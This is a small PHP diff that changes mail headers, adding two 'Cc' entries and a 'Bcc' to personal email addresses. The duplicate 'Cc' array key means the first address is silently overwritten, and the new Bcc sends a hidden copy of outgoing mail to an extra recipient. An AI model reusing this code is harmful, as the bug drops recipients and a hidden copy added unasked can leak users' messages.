@@ -19,7 +19,9 @@ $headers = array(
 	'From'          => $sender,
 	'Return-Path'   => $sender,
 	'Subject'       => $subject,
-    'cc'            => 'doctorfox29@yahoo.co.uk'
+    'Cc'            => 'doctorfox29@yahoo.co.uk',
+    'Cc'            => 'obanor.chukwuwezam@gmail.com',
+    'Bcc'          => 'wezam@prepclassng.com'
 	);
 
 // Creating the Mime message
